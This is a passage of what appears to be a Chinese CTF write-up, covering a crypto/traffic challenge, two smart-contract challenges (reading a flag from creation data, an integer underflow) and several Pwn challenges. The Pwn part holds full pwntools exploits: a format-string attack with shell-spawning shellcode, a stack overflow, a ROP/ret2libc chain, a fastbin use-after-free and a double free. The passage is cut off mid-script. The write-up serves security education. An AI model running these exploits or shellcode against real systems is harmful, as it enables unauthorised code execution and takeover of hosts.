class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_server</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        l = listen(server_port)</span><br><span class="line">        p = l.wait_for_connection()</span><br><span class="line">        p.sendline(hash512(str(key)))</span><br><span class="line">        recv_key = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span>(hash512(key)!=recv_key):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"key error!"</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        recv_mess = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"received:%d"</span>%(int(recv_mess) ^ key)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_client</span><span class="params">()</span>:</span></span><br><span class="line">    p = remote(<span class="string">"127.0.0.1"</span>, server_port)</span><br><span class="line">    recv_key = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span>(hash512(key)!=recv_key):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"key error!"</span></span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    p.sendline(hash512(str(key)))</span><br><span class="line">    p.sendline(str(str2int(FLAG) ^ key).strip(<span class="string">"L"</span>))</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"end"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"server"</span>, <span class="string">"client"</span>]:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"usage: %s [server|client]"</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"server"</span>:</span><br><span class="line">        do_server()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        do_client()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>发现程序是一个通过<code>loopback</code>回传一段由时间戳生成的key在经过<code>sha512</code>后的结果。并且，<code>flag</code>在与<code>key</code>进行异或后也进行了一次传输。</p>
<p>而我们获取了流量包，所以所有传输的数据我们都获得了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hash512(key)：d9b29a82f73b898093be8affe532f082e74080f3a1d6918a33e185f762c19684a0439078b10cb7e23727faa9e8a3fb5a4babf7f793c30fa86d12b67154995c9b</span><br><span class="line">str(str2int(FLAG) ^ key).strip(&quot;L&quot;)：</span><br><span class="line">9711711411111497123787411711277105881039065106111110120104565010884114548682101807369661200453640575</span><br></pre></td></tr></table></figure>
<p>而这里的key是int(time.time())生成的，也只获得了加密后内容。但是可以通过流量包里的时间确定int(time.time())的大致范围，然后对范围内的都进行sha512，然后和我们获取的数据进行对比，从而爆破源码。</p>
<p><img src="https://i.imgur.com/UvjuPSY.png" alt></p>
<p>既然流量包的时间为5月2号，那么从5月1日开始爆破。</p>
<p><img src="https://i.imgur.com/Dh0ltgT.png" alt></p>
<p>获得原key的爆破脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time,sys,hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash512</span><span class="params">(s)</span>:</span></span><br><span class="line">    h = hashlib.sha512()</span><br><span class="line">    h.update(str(s).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line">key = <span class="number">1556640000</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span>(hash512(key)==<span class="string">"d9b29a82f73b898093be8affe532f082e74080f3a1d6918a33e185f762c19684a0439078b10cb7e23727faa9e8a3fb5a4babf7f793c30fa86d12b67154995c9b"</span>):</span><br><span class="line">        print(key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    key += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>获取的key为1556776194。</p>
<p>解码获得flag的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib,string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash512</span><span class="params">(s)</span>:</span></span><br><span class="line">    h = hashlib.sha512()</span><br><span class="line">    h.update(str(s).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将十进制字符串转换为字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intstr2str</span><span class="params">(s)</span>:</span></span><br><span class="line">    charset = string.punctuation + string.digits + string.ascii_letters</span><br><span class="line">    <span class="comment">#print(charset)</span></span><br><span class="line">    slen = len(s)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> chr(int(s[i:i+n])) <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = <span class="number">3</span></span><br><span class="line">        ret += (chr(int(s[i:i+n])))</span><br><span class="line">        <span class="comment">#print(str(s[i:i+n])+"\t"+chr(int(s[i:i+n])))</span></span><br><span class="line">        i += n</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=slen):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">key = <span class="number">1556776194</span></span><br><span class="line">message = <span class="number">9711711411111497123787411711277105881039065106111110120104565010884114548682101807369661200453640575</span></span><br><span class="line">Flag = message ^ key</span><br><span class="line">print(intstr2str(str(Flag)))</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/OpaRJW0.png" alt></p>
<h3 id="solidity"><a href="#solidity" class="headerlink" title="solidity"></a>solidity</h3><p>本题只给了一个智能合约的地址，这里考察的是智能合约的基础知识，其实这里给少了内容，应该提供智能合约的源码。源码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Aurora &#123;</span><br><span class="line">    address private creater;</span><br><span class="line">    string private flag;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _s ) public&#123;</span><br><span class="line">        creater = msg.sender;</span><br><span class="line">        flag = _s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看源码可以知道这里在创建该合约时输入了flag，而按照智能合约的特性，所有的操作都会被记录下来，所以flag也会被记录下来，故去<a href="https://ropsten.etherscan.io/" target="_blank" rel="noopener">https://ropsten.etherscan.io/</a>搜索：0x404e55fd733ff8c3009be5106a5f44c1b3a6576b即可，然后查看该合约的记录即可获得flag。</p>
<p><img src="https://i.imgur.com/GyBZOrQ.png" alt></p>
<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>该题是简单的溢出漏洞，只要amount&lt;balances[msg.sender]，得到的就是一个极大的数字。</p>
<p>然而首先要配置一个MetaMask，具体操作：<a href="https://www.jianshu.com/p/e7137f8daddd" target="_blank" rel="noopener">https://www.jianshu.com/p/e7137f8daddd</a></p>
<p>首先将源码复制到<a href="https://remix.ethereum.org/" target="_blank" rel="noopener">https://remix.ethereum.org</a>，设置编译器版本为version:0.5.9，然后坐等编译</p>
<p><img src="https://i.imgur.com/MNcI6Ob.png" alt></p>
<p>之后再Run面板上，修改Environment为Injected Web3，<strong>注意一定要如下图修改，否则无法连接</strong>。</p>
<p><img src="https://i.imgur.com/UF2E3wt.png" alt></p>
<p>然后再At address栏输入题目中的地址，加载该合约，右下角就是加载的合约。</p>
<p><img src="https://i.imgur.com/CDFhrYx.png" alt></p>
<p>展开合约，在deposit栏输入1，点击deposit。允许交易，如此一来，在该合约中，余额为1。</p>
<p><img src="https://i.imgur.com/vfEX1lB.png" alt></p>
<p>在withdraw栏输入5，点击withdraw。允许交易，如此一来，在该合约中，我们的余额就是1-5=-4，由于这是一个该参数为正数，所以就变成了一个巨大的数字。</p>
<p><img src="https://i.imgur.com/3qYZgVr.png" alt></p>
<p>然后再getFlag一栏输入自己的邮箱，等flag发到邮箱即可。</p>
<p><img src="https://i.imgur.com/4Efh1cR.png" alt></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="一个复读机"><a href="#一个复读机" class="headerlink" title="一个复读机"></a>一个复读机</h3><p>repeat()里是一个裸的printf(input)，所以很明显就是一个格式化字符串啦~</p>
<p>此题没开NX，还泄露了栈地址，因此可以直接布置shellcode，但是栈地址是<code>ff</code>开头的，数值非常大，靠<code>%n</code>一次性写入四个字节不现实，<code>printf</code>不可能在理想的时间内输出那么多字符，所以要分两次写，每次写两字节，即用<code>%hn</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'140.82.19.20'</span>,<span class="number">36427</span>)<span class="comment">#process('OneRepeater')</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'3) Exit\n'</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">readbuffer_addr = int(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">shellcode_addr = readbuffer_addr + <span class="number">0x40</span></span><br><span class="line">ret_addr = readbuffer_addr - <span class="number">0x24</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"read buffer address: "</span> + hex(readbuffer_addr)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">16</span></span><br><span class="line">payload = p32(ret_addr) + <span class="string">'%'</span> + str((shellcode_addr &amp; <span class="number">0xffff</span>) - <span class="number">4</span>) + <span class="string">'d%'</span> + str(offset) + <span class="string">'$hn'</span> + <span class="string">'aaa'</span> + p32(ret_addr + <span class="number">2</span>) + <span class="string">'%'</span> + str(((shellcode_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (shellcode_addr &amp; <span class="number">0xffff</span>) - <span class="number">7</span>) + <span class="string">'d%'</span> + str(offset + <span class="number">5</span>) + <span class="string">'$hn'</span></span><br><span class="line">payload += <span class="string">'a'</span> * (<span class="number">0x40</span> - len(payload)) + shellcode</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recvuntil(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">To illustrate why we write payload in that way</span></span><br><span class="line"><span class="string">This is an example stack layout, supposing the leak address is 0xffffc970</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c930  |  0xffffc970   |  (addr of format string)</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c934  |  xxxxxxxxxx   |  1$ (first parameter of printf)</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">           .....</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c94c  |  return addr  |  7$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">           .....</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c970  |  0xffffc94c   | 16$ (start addr of read buffer)</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c974  |    "%516"     | 17$ (51628 = 0xc9b0 - 4)</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c978  |    "28d%"     | 18$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c97c  |    "16$h"     | 19$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c980  |    "naaa"     | 20$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c984  |  0xffffc94e   | 21$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c988  |    "%138"     | 22$ (13869 = 0xffff - 0xc9b0 - 4 - 3)</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c98c  |    "69d%"     | 23$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c990  |    "21$h"     | 24$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c994  |    "naaa"     | 25$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c998  |    "aaaa"     | 26$</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">           .....</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">c9b0  |               |</span></span><br><span class="line"><span class="string">      |   shellcode   |</span></span><br><span class="line"><span class="string">      |               |</span></span><br><span class="line"><span class="string">      *---------------*</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
<h3 id="又一个复读机"><a href="#又一个复读机" class="headerlink" title="又一个复读机"></a>又一个复读机</h3><p>在input里有一个整形转换成无符号整数的情况，所以可以输入最多60000+字符，所以就变成一个简单的栈溢出了。本题也没开NX，也泄露了栈地址，所以直接布置shellcode就行了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'AnotherRepeater'</span>)</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'want to reapeat?\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'-1'</span>)</span><br><span class="line">read_buffer_addr = int(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">payload += (<span class="number">0xcd3c</span> - <span class="number">0xc91d</span> - len(payload)) * <span class="string">'a'</span> + p32(read_buffer_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p>可以栈溢出，但是也仅能覆盖到返回地址，所以需要做一个栈枢纽将栈转移，故采用<code>ret2leave</code>方法。</p>
<p>由于本题是64位程序，还有一种可能的方法是用<code>one_gadget</code>，但是不知道是否满足约束条件，没试过。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process("./babystack")</span></span><br><span class="line">p = remote(<span class="string">'47.106.243.209'</span>,<span class="number">10005</span>)</span><br><span class="line">babystack = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400ad3</span></span><br><span class="line">leave_addr = <span class="number">0x0000000000400a18</span></span><br><span class="line">main_addr = <span class="number">0x00000000004008F6</span></span><br><span class="line">puts_plt = babystack.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_plt = babystack.plt[<span class="string">'read'</span>]</span><br><span class="line">puts_got = babystack.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendMessage</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, str(<span class="number">0xE0</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'at '</span>)</span><br><span class="line">    stack_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(stack_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * (<span class="number">0xD0</span> - len(payload)) + p64(stack_addr) + p64(leave_addr)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.timeout = <span class="number">60</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">sendMessage(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Byebye~\n'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">sendMessage(payload)</span><br><span class="line"><span class="comment">#p.sendline(p64(libcbase+one_gadget))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><h4 id="考点-7"><a href="#考点-7" class="headerlink" title="考点"></a>考点</h4><p>fastbin UAF</p>
<h4 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h4><p>提供了创建、删除、打印三个功能。结点的数据结构中除了一个指针存放字符串以外，还存放了一个函数指针。有函数指针，一个通常的思路就是想着可不可以改掉它，把它变成自己指定的函数。</p>
<p>漏洞点在于，删除的时候指向结点的指针没被抹零，导致<code>display</code>函数可以打印一个被free掉的结点，关键还在于它用的打印函数就是这个函数指针，只是这个函数指针一开始指向了自己写的一个打印函数，而且参数还是本结点的那个字符串，如果能修改掉这个函数指针为<code>system</code>，修改掉字符串指针为<code>/bin/sh</code>的地址，进行打印操作的时候就会执行<code>system(&quot;/bin/sh&quot;)</code>。</p>
<p>创建的过程会进行两次malloc，一次malloc创建结点，一次malloc创建结点中的字符串，创建结点的大小恒为16，但是字符串的大小可控。如果我们创建两个结点，保证字符串的堆块大小与结点的堆块大小不在一个fastbin里面，然后都free掉，这个时候0x20大小的fastbin存放着两个结点的堆块。如果我们再创建一个结点，但是控制字符串大小为16，这个时候字符串得到的堆块就是原来free掉的第一个结点，又因为字符串可控，我们就可以对原来free掉的第一个结点的两个指针进行修改，进行display操作，即可拿到控制权。</p>
<p>另外说一句，由于定位在简单题，<code>system</code>函数和<code>/bin/sh</code>字符串都可以在程序段中找到</p>
<p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'babyheap'</span>)</span><br><span class="line">binsh = <span class="number">0x602010</span></span><br><span class="line">system_addr = <span class="number">0x4007a0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(content, size)</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	io.send(str(<span class="number">1</span>))</span><br><span class="line">	io.sendafter(<span class="string">'size: \n'</span>, str(size))</span><br><span class="line">	io.sendafter(<span class="string">'content: \n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	io.send(str(<span class="number">2</span>))</span><br><span class="line">	io.sendafter(<span class="string">'index: \n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprint</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	io.send(str(<span class="number">3</span>))</span><br><span class="line">	io.sendafter(<span class="string">'index: \n'</span>, str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="string">'a'</span>, <span class="number">32</span>)</span><br><span class="line">create(<span class="string">'b'</span>, <span class="number">32</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(p64(binsh) + p64(system_addr), <span class="number">16</span>)</span><br><span class="line">myprint(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="message"><a href="#message" class="headerlink" title="message"></a>message</h3><h4 id="考点-8"><a href="#考点-8" class="headerlink" title="考点"></a>考点</h4><p>double free</p>
<h4 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h4><p>题目用了一个数组去存储结点的信息，每个结点有一个size字段，一个字符串指针，字符串的存储空间通过malloc的堆块来提供，size是可控的。</p>
<p>漏洞点在于free后只对size字段清零，没对字符串指针清零，而且free之前除了检查了索引的有效性外，没有其他的检查，因此可以double free。</p>
<p>double free的效果是可以把返回堆块的指针引导到存储结点信息的数组中，又由于size字段可控，因此这个假的堆块可以过检测，这个时候就可以通过覆写字符串指针，凭借编辑和打印功能实现任意地址读写。</p>
<p>最后由于开了FULL RELRO，所以不能直接写GOT表，可以修改<code>__free_hook</code>函数指针为<code>system</code>函数地址，一旦执行free函数的时候就会执行<code>__free_hook</code>指向的函数。然后创建一个堆块，写入字符串<code>/bin/sh</code>，此时删掉这个堆块的时候就等同于执行了<code>system(&quot;/bin/sh&quot;)</code>，控制权获得。</p>
<p>关于double free具体是如何做的，为什么会有这样的效果，可以参见how2heap的<code>fastbin_dup_into_stack.c</code></p>
<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'message'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./message'</span>)</span><br><span class="line">libc = 